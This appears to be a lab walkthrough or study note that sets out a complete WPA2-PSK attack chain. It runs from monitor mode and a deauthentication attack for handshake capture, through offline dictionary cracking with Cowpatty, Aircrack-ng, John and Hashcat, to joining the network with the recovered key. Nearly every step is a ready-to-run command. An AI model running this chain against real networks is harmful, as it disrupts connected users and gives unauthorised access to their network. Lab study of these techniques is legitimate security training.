# Chain #10: Traditional WPA/WPA2 Password Attack

## Goal & Scope

Recover a WPA2‑PSK passphrase from a captured **4‑Way Handshake**, using reconnaissance, capture, offline cracking, and access verification.

This chain focuses **only** on the traditional WPA workflow. Advanced cracking strategies (rules, masks, combinator, hybrid, CPU/GPU tuning) are left for later chains.

---

## Step 1 — Reconnaissance

Put the NIC into monitor mode and identify the target AP and client.

**Enable monitor mode:**

```bash
sudo airmon-ng start wlan0
```

- `airmon-ng`: Tool that manages wireless interfaces for Aircrack‑ng suite.
- `start wlan0`: Tells airmon‑ng to put interface `wlan0` into monitor mode.
- Result: New interface `wlan0mon` created.
- Monitor mode = listen to all 802.11 traffic without being associated.

**Scan networks and save output:**

```bash
sudo airodump-ng wlan0mon -c 1 -w WPA
```

- `wlan0mon`: Interface in monitor mode.
- `-c 1`: Lock scanning to channel 1 (prevents hopping and missing packets).
- `-w WPA`: Save capture to file prefix `WPA` → produces `WPA-01.cap`.

Take note of:

- **BSSID** (MAC address of AP).
- **ESSID** (SSID string).
- **STATION** (client MAC) with live traffic.

---

## Step 2 — Handshake Capture

Force a reconnect to elicit the 4‑Way Handshake; verify it’s present.

**Deauthenticate a client:**

```bash
sudo aireplay-ng -0 5 -a <AP_BSSID> -c <CLIENT_MAC> wlan0mon
```

- `aireplay-ng`: Tool for packet injection attacks.
- `-0`: Deauthentication attack type.
- `5`: Number of deauth bursts to send (0 = infinite).
- `-a <AP_BSSID>`: Target AP MAC address.
- `-c <CLIENT_MAC>`: Target client MAC.
- `wlan0mon`: Monitor mode interface.

Effect: Client disconnects, then reconnects → handshake packets captured.

**Confirm in airodump‑ng window:**

```
[ WPA handshake: <AP_BSSID> ]
```

**Optional: Validate capture with Cowpatty:**

```bash
cowpatty -c -r WPA-01.cap
```

- `-c`: Check mode (only verifies handshake validity).
- `-r WPA-01.cap`: Reads the capture file.
- Output: “Collected all necessary data …” if handshake is good.

---

## Step 3 — Password Cracking

Use the capture to attempt dictionary cracking with multiple tools.

### 3.A — Cowpatty

```bash
cowpatty -r WPA-01.cap -f /opt/wordlist.txt -s "HackTheBox"
```

- `-r WPA-01.cap`: Capture file containing handshake.
- `-f /opt/wordlist.txt`: Wordlist path.
- `-s "HackTheBox"`: Target SSID (needed for key derivation).

### 3.B — Aircrack‑ng

```bash
sudo aircrack-ng WPA-01.cap -w /opt/wordlist.txt
```

- `WPA-01.cap`: Handshake capture.
- `-w /opt/wordlist.txt`: Wordlist to test.
- Output: Shows cracking progress and displays `KEY FOUND!` if successful.

### 3.C — John the Ripper

**Convert handshake to John format:**

```bash
/opt/wpapcap2john WPA-01.cap > hash
```

- `wpapcap2john`: Converts .cap into a hash format John can process.
- Output redirected to file `hash`.

**Crack with wordlist:**

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=wpapsk
```

- `--wordlist`: Path to dictionary.
- `--format=wpapsk`: Specifies WPA cracking mode.

**Show results:**

```bash
john hash --show
```

- Displays recovered passwords.

### 3.D — Hashcat

**Convert capture to mode 22000 format:**

```bash
hcxpcapngtool -o hash WPA-01.cap
```

- `hcxpcapngtool`: Converts .cap into Hashcat’s unified WPA format.
- `-o hash`: Output file named `hash`.

**Run dictionary attack:**

```bash
hashcat -m 22000 hash /opt/wordlist.txt
```

- `-m 22000`: Hashcat mode for WPA‑EAPOL/PMKID.
- `hash`: Converted handshake.
- `/opt/wordlist.txt`: Wordlist path.

**Show cracked passwords:**

```bash
hashcat -m 22000 hash /opt/wordlist.txt --show
```

- Displays cracked PSK(s) if present in potfile.

---

## Step 4 — Access Verification

Confirm cracked PSK by connecting to the network.

### 4.A — NetworkManager CLI

```bash
nmcli dev wifi connect "HackTheBox" password "<PSK>"
```

- `nmcli`: Command‑line interface for NetworkManager.
- `dev wifi connect`: Connect to SSID.
- `password`: Supply cracked PSK.

### 4.B — wpa_supplicant

**Generate config with passphrase:**

```bash
wpa_passphrase "HackTheBox" "<PSK>" | sudo tee /etc/wpa_supplicant/htb.conf >/dev/null
```

- `wpa_passphrase`: Creates WPA config block.
- `tee /etc/wpa_supplicant/htb.conf`: Save config.

**Start wpa_supplicant:**

```bash
sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/htb.conf
```

- `-B`: Run in background.
- `-i wlan0`: Interface.
- `-c`: Config file path.

**Request DHCP lease:**

```bash
sudo dhclient wlan0
```

- Obtains IP from AP to confirm access.

---

## Checklist (Quick Run)

1. `airmon-ng start wlan0`
2. `airodump-ng wlan0mon -c <ch> -w WPA`
3. `aireplay-ng -0 5 -a <BSSID> -c <STA> wlan0mon`
4. Confirm `[ WPA handshake: <BSSID> ]`
5. Crack with Cowpatty / Aircrack‑ng / John / Hashcat
6. Verify access with `nmcli` or `wpa_supplicant`